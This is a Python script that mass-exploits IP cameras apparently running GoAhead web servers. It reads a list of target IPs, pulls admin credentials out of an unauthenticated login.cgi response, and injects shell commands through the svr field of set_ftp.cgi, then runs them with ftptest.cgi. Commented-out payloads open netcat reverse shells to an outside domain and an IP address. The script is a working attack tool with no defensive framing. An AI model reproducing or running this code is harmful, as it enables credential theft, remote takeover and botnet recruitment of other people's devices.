import socket
import sys
import re
import time
from multiprocessing import Process

def retrieve_credentials(host, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.settimeout(5)
        sock.connect((host, int(port)))
    except:
        sock.close()
        return 0
    # Retrieved credentials
    try:
        sock.send("GET login.cgi HTTP/1.0\n\n")
        resp = sock.recv(1024)
        # Double receive
        resp += sock.recv(1024)
    except:
        sock.close()
        return 0
    if not resp:
        sock.close()
        return 0
    index = resp.find("var login")
    done = resp[index:]
    m = done.strip("\r\n")
    l = m.split(" ")
    if len(l) <= 1:
        sock.close()
        return 0
    try:
        preuser = l[1].strip("var \r\n")
        prepass = l[2].strip("var \r\n")
    except:
        return 0
    username = preuser[11:].strip('";')
    password = prepass[11:].strip('";')
    sock.close()
    return username + ":" + password

def submit_payload(host, port, payload):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.settimeout(5)
        sock.connect((host, int(port)))
    except:
        sock.close()
        return 0
    try:
        sock.send(payload)
    except:
        sock.close()
        return 0
    sock.close()
    return 1

def submit_payload2(host, port, payload):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.settimeout(5)
        sock.connect((host, int(port)))
    except:
        sock.close()
        return 0
    try:
        sock.send(payload)
    except:
        sock.close()
        return 0
    now = time.clock()
    while (time.clock() - now) < 30:
        try:
            resp = sock.recv(1024)
        except:
            break
        if not resp:
            break
        if "ok" in resp:
            sock.close()
            return 1
    sock.close()
    return 0

def run(host, port):
    ret = retrieve_credentials(host, port)
    if ret == 0:
        return
    str = ret.split(":")
    username = str[0]
    password = str[1]
    if username != "" and password != "":
        print "Retrieved credentials %s:%s" % (str[0], str[1])
    else:
        return
    # Continue assuming we've retrieved the credentials successfully
    #payload = "GET /set_ftp.cgi?loginuse=" + username + "&loginpas=" + password + "&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+nexusiotsolutions.net+1234+-e+%2Fbin%2Fsh%29 HTTP/1.0\n\n"
    for i in open("file", "r").readlines():
        line = i.strip("\r\n")
        payload = "GET /set_ftp.cgi?loginuse=" + username + "&loginpas=" + password + "&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28" + line + "%29 HTTP/1.0\n\n"
        ret = submit_payload(host, port, payload)
        if ret == 0:
            print "failed to send payload - %s (timeout?)" % (host)
            return
        payload2 = "GET /ftptest.cgi?loginuse=%s&loginpas=%s HTTP/1.0\n\n" % (username, password)
        ret = submit_payload2(host, port, payload2)
        if ret == 0:
            print "failed to send payload - %s (timeout?)" % (host)
            return
        """payload = "GET /set_ftp.cgi?loginuse=" + username + "&loginpas=" + password + "&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+37.48.99.233+1234+-e+%2Fbin%2Fsh%29 HTTP/1.0\n\n"
        ret = submit_payload(host, port, payload)
        if ret == 0:
        print "Failed to send initial payload"
        return
        print "Sent initial payload, building & preparing to send the second"
        payload2 = "GET /ftptest.cgi?loginuse=%s&loginpas=%s HTTP/1.0\n\n" % (username, password)
        ret = submit_payload2(host, port, payload2)
        if ret == 0:
        print "Failed to send submit payload"
        return"""

if __name__ == "__main__":
    for i in open("goahead", "r").readlines():
        line = i.strip("\r\n")
        info = line.split(":")
        ip = info[0]
        port = 81
        p = Process(target=run, args=(ip,port,))
        p.start()